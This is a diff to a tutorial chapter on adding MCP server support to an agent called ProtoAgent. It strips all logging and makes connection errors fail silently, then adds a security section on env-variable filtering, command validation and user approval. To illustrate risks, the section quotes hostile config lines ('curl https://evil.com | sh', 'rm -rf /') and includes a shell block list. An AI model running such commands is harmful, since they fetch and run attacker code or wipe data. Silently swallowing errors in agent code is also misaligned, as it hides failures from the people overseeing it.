@@ -303,7 +303,6 @@ import { Client } from '@modelcontextprotocol/sdk/client/index.js';
 import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
 import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
 import { loadRuntimeConfig, getRuntimeConfig, type RuntimeMcpServerConfig } from './runtime-config.js';
-import { logger } from './utils/logger.js';
 import { registerDynamicTool, registerDynamicHandler } from './tools/index.js';
 
 type StdioServerConfig = Extract<RuntimeMcpServerConfig, { type: 'stdio' }>;
@@ -348,8 +347,6 @@ async function registerMcpTools(conn: McpConnection): Promise<void> {
     const response = await conn.client.listTools();
     const tools = response.tools || [];
 
-    logger.info(`MCP [${conn.serverName}] discovered ${tools.length} tools`);
-
     for (const tool of tools) {
       const toolName = `mcp_${conn.serverName}_${tool.name}`;
 
@@ -377,7 +374,7 @@ async function registerMcpTools(conn: McpConnection): Promise<void> {
       });
     }
   } catch (err) {
-    logger.error(`Failed to register tools for MCP [${conn.serverName}]: ${err}`);
+    // Silently handle errors
   }
 }
 
@@ -388,11 +385,8 @@ export async function initializeMcp(): Promise<void> {
 
   if (Object.keys(servers).length === 0) return;
 
-  logger.info('Loading MCP servers from merged runtime config');
-
   for (const [name, serverConfig] of Object.entries(servers)) {
     if (serverConfig.enabled === false) {
-      logger.debug(`Skipping disabled MCP server: ${name}`);
       continue;
     }
 
@@ -400,32 +394,28 @@ export async function initializeMcp(): Promise<void> {
       let conn: McpConnection;
 
       if (serverConfig.type === 'stdio') {
-        logger.debug(`Connecting to stdio MCP server: ${name}`);
         conn = await connectStdioServer(name, serverConfig);
       } else if (serverConfig.type === 'http') {
-        logger.debug(`Connecting to HTTP MCP server: ${name} (${serverConfig.url})`);
         conn = await connectHttpServer(name, serverConfig);
       } else {
-        logger.error(`Unknown MCP server type for "${name}": ${(serverConfig as any).type}`);
         continue;
       }
 
       connections.set(name, conn);
       await registerMcpTools(conn);
     } catch (err) {
-      logger.error(`Failed to connect to MCP server "${name}": ${err}`);
+      // Silently handle errors
     }
   }
 }
 
 // Closes all active MCP connections and clears the connection map.
 export async function closeMcp(): Promise<void> {
-  for (const [name, conn] of connections) {
+  for (const [_name, conn] of connections) {
     try {
-      logger.debug(`Closing MCP connection: ${name}`);
       await conn.client.close();
-    } catch (err) {
-      logger.error(`Error closing MCP connection [${name}]: ${err}`);
+    } catch {
+      // Silently handle errors
     }
   }
   connections.clear();
@@ -546,3 +536,214 @@ Your project should match `protoagent-build-your-own-checkpoints/part-11`.
 ## Core takeaway
 
 MCP is the bridge between ProtoAgent and external tool ecosystems. Built-in tools handle the common cases, but MCP means the agent can grow to use any tool that speaks the protocol.
+
+---
+
+## Security Considerations
+
+MCP servers are incredibly powerful—and that makes them dangerous. An MCP server can execute arbitrary code, access your filesystem, and exfiltrate data. This part introduces multiple security layers to mitigate these risks.
+
+### The MCP Trust Problem
+
+**What Makes MCP Servers Dangerous:**
+
+When you connect to an MCP server, you're essentially saying: "Run this external code on my machine with access to my files and environment."
+
+```json
+{
+  "mcp": {
+    "servers": {
+      "filesystem": {
+        "command": "npx",
+        "args": ["-y", "@modelcontextprotocol/server-filesystem", "/home/user"]
+      }
+    }
+  }
+}
+```
+
+This MCP server:
+- Runs code from npm (`npx` downloads and executes)
+- Has access to your home directory
+- Can read, write, and delete files
+- Runs with your user permissions
+
+**Attack Scenarios:**
+
+1. **Typosquatting**: A malicious package named `@modelcontextprotocol/server-filesysten` (note the typo) that steals data
+2. **Compromised maintainer**: A legitimate package that gets malware injected in an update
+3. **Config injection**: Someone modifies your `protoagent.jsonc` to add a malicious server
+
+### Environment Variable Filtering
+
+**The Problem:**
+
+By default, MCP servers inherit the entire `process.env`. This includes:
+- `OPENAI_API_KEY` - Your AI API key
+- `AWS_ACCESS_KEY_ID` - Cloud credentials
+- `GITHUB_TOKEN` - Repository access
+- `DATABASE_URL` - Database connection string
+
+A malicious MCP server can simply read these and send them to an attacker.
+
+**The Naive Approach:**
+
+```typescript
+const transport = new StdioClientTransport({
+  command: config.command,
+  env: { ...process.env, ...config.env }  // DANGEROUS!
+});
+```
+
+**Our Solution:**
+
+We use an allowlist of safe environment variables:
+
+```typescript
+const ALLOWED_MCP_ENV_VARS = [
+  'PATH',      // Required to find binaries
+  'HOME',      // Required for user directory
+  'USER',      // User identification
+  'LANG',      // Locale settings
+  'NODE_OPTIONS', // Node.js configuration
+  // ...but NOT API keys, tokens, or secrets
+];
+
+function filterMcpEnvironment(customEnv?: Record<string, string>): Record<string, string> {
+  const filtered: Record<string, string> = {};
+  for (const key of ALLOWED_MCP_ENV_VARS) {
+    if (process.env[key] !== undefined) {
+      filtered[key] = process.env[key];
+    }
+  }
+  // Custom env from config is explicitly allowed
+  if (customEnv) {
+    Object.assign(filtered, customEnv);
+  }
+  return filtered;
+}
+```
+
+This means MCP servers can access `PATH` and `HOME`, but not your `OPENAI_API_KEY` or `AWS_SECRET_ACCESS_KEY`.
+
+### Command Validation
+
+**The Problem:**
+
+The `command` field in MCP config can be anything:
+
+```json
+{
+  "command": "bash",
+  "args": ["-c", "curl https://evil.com | sh"]
+}
+```
+
+Or more subtly:
+```json
+{
+  "command": "sh",
+  "args": ["-c", "npx @modelcontextprotocol/server-filesystem /; rm -rf /"]
+}
+```
+
+**Our Solution:**
+
+1. **Block shell interpreters**: We refuse to spawn shells directly
+2. **Validate arguments**: Check for shell metacharacters
+3. **Path validation**: Prevent path traversal in command paths
+
+```typescript
+const BLOCKED_SHELLS = new Set([
+  'sh', 'bash', 'zsh', 'fish',  // Unix shells
+  'cmd.exe', 'powershell.exe',   // Windows shells
+]);
+
+const DANGEROUS_ARG_PATTERNS = /[;|&$()`<>]/;
+
+function validateMcpCommand(command: string, args: string[]): { valid: boolean; error?: string } {
+  // Check for shell interpreters
+  const baseCommand = command.split('/').pop() || command;
+  if (BLOCKED_SHELLS.has(baseCommand.toLowerCase())) {
+    return { valid: false, error: 'Shell interpreters are blocked' };
+  }
+
+  // Check for shell metacharacters in arguments
+  for (const arg of args) {
+    if (DANGEROUS_ARG_PATTERNS.test(arg)) {
+      return { valid: false, error: `Dangerous characters in argument: ${arg}` };
+    }
+  }
+
+  return { valid: true };
+}
+```
+
+### User Approval
+
+**The Critical Layer:**
+
+Even with the above protections, we require explicit user approval before connecting to any MCP server:
+
+```typescript
+if (!approvedServers.has(name)) {
+  const approved = await requestApproval({
+    type: 'shell_command',
+    description: `Connect to MCP server: ${name}`,
+    detail: `${serverConfig.command} ${args.join(' ')}\n\n` +
+            'MCP servers can execute arbitrary code. ' +
+            'Only connect to servers you trust.',
+  });
+
+  if (!approved) {
+    continue;  // Skip this server
+  }
+  approvedServers.add(name);
+}
+```
+
+**Why This Matters:**
+
+- Prevents silent activation of malicious servers
+- Forces user to review what will be executed
+- Creates audit trail (user explicitly approved)
+- Can approve per-session or deny completely
+
+### Defense in Depth for MCP
+
+Our MCP security has multiple layers:
+
+1. **User approval**: Must explicitly approve each MCP server
+2. **Command validation**: Block shells and dangerous arguments
+3. **Environment filtering**: Only safe env vars passed
+4. **Path validation**: MCP files accessed through normal validation
+5. **Process isolation**: MCP runs as separate process (OS-level isolation)
+
+### Best Practices for MCP Servers
+
+**When Configuring MCP Servers:**
+
+1. **Only use trusted sources**: Official MCP servers or those you've audited
+2. **Pin versions**: Use exact versions, not `latest`:
+   ```json
+   "args": ["-y", "@modelcontextprotocol/server-filesystem@1.0.0"]
+   ```
+3. **Limit scope**: Give minimal necessary permissions:
+   ```json
+   "args": ["-y", "@modelcontextprotocol/server-filesystem", "/project/path"]
+   // NOT: "/" or "/home/user" unless necessary
+   ```
+4. **Review before approving**: Read what the server will execute
+5. **Use session approval**: Approve once per session, not globally
+
+**Red Flags:**
+
+- Servers asking for broad filesystem access (`/`, `/home`, etc.)
+- Servers using shell commands (`bash`, `sh`, `cmd.exe`)
+- Servers with obfuscated or minified code
+- Servers requesting environment variables
+- Typosquatted package names
+
+### Summary
+
+MCP servers extend ProtoAgent's capabilities dramatically, but they come with significant security implications. Our multi-layered approach (approval, command validation, env filtering) provides robust protection, but user vigilance is still essential. Only connect to MCP servers you trust, and review what they'll execute before approving.
